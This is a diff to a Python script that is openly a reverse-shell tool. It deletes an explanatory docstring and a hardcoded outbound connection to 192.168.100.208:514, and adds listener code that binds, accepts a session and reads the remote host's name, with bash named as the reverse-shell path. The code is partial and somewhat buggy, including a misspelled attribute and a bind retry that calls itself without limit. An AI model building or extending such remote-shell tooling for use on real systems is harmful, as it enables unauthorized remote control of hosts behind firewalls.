@@ -1,38 +1,10 @@
 #!/usr/bin/python3
-"""
-To establish a typical remote shell, a machine controlled by the attacker 
-connects to a remote network host and requests a shell session – this is called 
-a bind shell. But what if the remote host is not directly accessible, for example 
-because it has no public IP or is protected by a firewall? In this situation, a 
-reverse shell might be used, where the target machine initiates an outgoing connection 
-to a listening network host and a shell session is established.
-
-Reverse shells are often the only way to perform remote maintenance on hosts behind a NAT,
-so they have legitimate administrative uses. However, they can also be used by cybercriminals 
-to execute operating system commands on hosts protected from incoming connections by a firewall 
-or other network security systems. For example, a piece of malware installed on a local
-workstation via a phishing email or a malicious website might initiate an outgoing connection
-to a command server and provide hackers with a reverse shell capability. Firewalls mostly filter 
-incoming traffic, so an outgoing connection to a listening server will often succeed.
-
-When attempting to compromise a server, an attacker may try to exploit a command injection vulnerability 
-on the server system. The injected code will often be a reverse shell script to provide a convenient command
-shell for further malicious activities.
-"""
 
 import socket
 import sys
 import getopt
 import os
 from IPy import IP
-
-payload = ''
-path = "/usr/bin/bash" # path to reverse shell
-stack = list()
-info = False
-port = 0
-host = ''
-reverse = False
 
 
 class Socket_connection:
@@ -41,18 +13,45 @@ class Socket_connection:
         self.sock = None
         self.port = port_
         self.host = host_
+        self.host_name = None
+        self.connect = None
+        self.address = None
 
-
-    def create_connection_server(self):
+    def socket_create(self):
+        """Create the connection for the sockets"""
         try:
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            #self.sock.bind((self.host, self.port))
-            self.sock.connect(("192.168.100.208", 514))
+        except socket.error as error:
+            print("Error creating socket by: ",str(error))
+
+
+    def socket_bind(self):
+
+        try:
+            self.sock.bind((str(self.host), int(self.port)))
             self.sock.listen(1)
             print("[*] Connection stablished...")
         except Exception as e:
-            print("Connection error: ", str(e))
+            print("Socket binding error: ", str(e))
+            self.socket_bind()
+            
+    def socket_accept_connection(self):
 
+        try:
+            self.connect, self.addrress = self.sock.accept()
+            print("[*] Session opened at %s %s"%(self.addrress[0], self.addrress[1]))
+            print("\n")
+            self.host_name = self.connect.recv(1024)
+        except socket.error as err:
+            print("Error getting the connection: ", str(err))
+
+payload = ''
+path = "/usr/bin/bash" # path to reverse shell
+stack = list()
+info = False
+port = 0
+host = ''
+reverse = False
 
 
 
@@ -146,7 +145,9 @@ def init_process():
                 print(port)
                 if port is not None and host is not None:
                     sock = Socket_connection(host, port)
-                    sock.create_connection_server()
+                    sock.socket_create()
+                    sock.socket_bind()
+                    sock.socket_accept_connection()
                     
                 else:
                     showing()
